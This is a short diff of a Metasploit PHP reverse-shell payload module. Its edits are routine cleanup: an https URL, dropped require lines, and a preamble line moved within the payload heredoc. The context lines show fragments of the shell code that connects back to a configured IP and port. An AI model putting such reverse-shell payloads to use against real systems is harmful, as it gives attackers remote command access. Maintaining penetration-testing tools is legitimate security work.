@@ -1,11 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/payload/php'
-require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
@@ -64,9 +61,9 @@ module MetasploitModule
     end
 
     shell=<<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: "$dis")}
     $ipaddr='#{ipaddr}';
     $port=#{port};
-    #{php_preamble(disabled_varname: "$dis")}
 
     if(!function_exists('#{exec_funcname}')){
       function #{exec_funcname}($c){
@@ -129,5 +126,4 @@ module MetasploitModule
   def generate
     return super + php_reverse_shell
   end
-
 end
